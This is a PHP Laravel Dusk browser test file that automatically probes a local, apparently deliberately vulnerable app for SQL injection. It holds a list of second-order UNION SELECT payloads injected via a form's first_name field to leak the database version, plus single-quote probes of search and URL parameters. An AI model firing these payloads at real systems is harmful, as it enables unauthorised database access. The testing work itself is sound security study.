<?php

namespace Tests\Browser;

use Illuminate\Foundation\Testing\DatabaseMigrations;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Str;
use Laravel\Dusk\Browser;
use Tests\DuskTestCase;

class PhotoTest extends DuskTestCase
{
//    use DatabaseMigrations;

    protected $env_debug_on = [
        'true'  => [
            '500' => 'Syntax error:',
        ],
        'false' => [
            '500' => 'SERVER ERROR',
        ],
    ];

    protected $secondOrderSQLiQueries = [
        "--' UNION SELECT 1, null, version(), null, null, null, null, null, null, null--'",
        "--' UNION SELECT 1, null, version(), null, null, null, null, null, null, null, null--'",
        "--' UNION SELECT 1, null, version(), null, null, null, null, null, null, null, null, null--'",
        "--' UNION SELECT 1, null, null, null, null, null, null, null, null, null, null, null, version(), null, null, null, null, null, null, null--'",
    ];


    public function testSecondOrderSQLi()
    {
        $this->browse(function (Browser $browser) {

            // TODO - Test all parameters

            collect($this->secondOrderSQLiQueries)->each(function ($q) use ($browser) {
                $maliciousString = $q;

                $browser->visit('/create')
                    ->typeSlowly('email', 'stefan.dudasko' . Str::random(5) . '@gmail.com', 10)
                    ->typeSlowly('last_name', 'xuser last_name', 10)
                    ->typeSlowly('title', 'xuser title', 10)
                    ->typeSlowly('price', 10, 10)
                    ->typeSlowly('description', 'description', 10)
                    ->typeSlowly('first_name', $maliciousString, 10)
                    ->press('Submit');

                // TODO - lets suppose we got 500 - check we really have 500
                // TODO nech nie je page fixne - http://pib_sqli.test/sqli?page=4

                $browser
                    ->visit('/sqli?page=1')
                    ->scrollToElement('a:contains(UNION SELECT):last');

                try {
                    $browser->visit('/sqli?page=1')
                        ->pause(500)
                        ->clickLink('UNION SELECT', 'a:contains(UNION SELECT):last')
                        ->pause(500)
                        ->assertSee("PostgreSQL")
                        ->pause(5000000);

                    Log::info("Success! Query: " . $maliciousString);
                } catch (\Exception $e) {

                }
            });

            $browser->storeConsoleLog('_test_' . now());
        });
    }

    /**
     * A Dusk test example.
     *
     * @return void
     * @throws \Throwable
     */
    public function testCreateFormParams()
    {
        $this->browse(function (Browser $browser) {
            $browser->visit('/create')
                ->typeSlowly('email', 'xdudasko@stuba.sk', 20)
                ->typeSlowly('first_name', 'xuser first_name', 20)
                ->typeSlowly('last_name', 'xuser last_name', 20)
                ->typeSlowly('title', 'xuser title', 20)
                ->typeSlowly('price', 10, 20)
                ->typeSlowly('description', 'description', 20)
                ->press('Submit');
        });
    }

    public function testListingSearch()
    {
        $debug = getenv('APP_DEBUG');
        $expected_error_text_500 = $this->env_debug_on[$debug][500];

        $this->browse(function (Browser $browser) use ($expected_error_text_500) {

            // TODO - Test all parameters

            try {
                $browser->visit('/sqli')
                    ->typeSlowly('q', '\'', 20)
                    ->pause(1000)
                    ->press('Search')
                    ->assertSee($expected_error_text_500);
            } catch (\Exception $e) {
//                TODO - check if 500
            }

            $links = collect($browser->elements('a'));
            $links_count = $links->count();

            while (!$links->isEmpty()) {
                try {
                    $link = $links->first();
                    $links->shift();
                    $link->click();

                    $browser->visit('/sqli');
                } catch (\Exception $e) {
                    var_dump($e->getMessage());
                }
            }

            $browser->storeConsoleLog('_test_' . now());
        });
    }

    public function testListingAttributes()
    {
        $this->browse(function (Browser $browser) {

            $browser->visit('/sqli')
                ->typeSlowly('q', '\'', 20)
                ->pause(1000)
                ->press('Search');

            $browser->visit('/sqli');

            $links = collect($browser->elements('a'));
            $links_count = $links->count();

            $counter = 0;
            while ($counter < $links_count) {
                try {
                    $links_count--;
                    $browser->visit('/sqli');

                    $links = collect($browser->elements('a'));
                    $link = $links->get($counter);
                    $url = $link->getAttribute('href');

                    $parts = parse_url($url);

                    if ($parts['query']) { // We found query parameters
                        $query_params = explode('&', $parts['query']);

                        $param_information = explode('=', $query_params[0]);
                        $param_key = $param_information[0];
                        $param_val = $param_information[1];

                        $links->shift();
//                        $link->click(); // No need to click now, we want to modify parameters
                        $new_link = "pib_sqli.test/sqli?$param_key='";

                        $debug = getenv('APP_DEBUG');
                        $expected_error_text_500 = $this->env_debug_on[$debug][500];

                        $browser->visit($new_link)
                            ->assertSee($expected_error_text_500);
                    }

                } catch (\Exception $e) {

                }
                $counter++;
            }

            $browser->storeConsoleLog('_test_' . now());
        });


    }
}
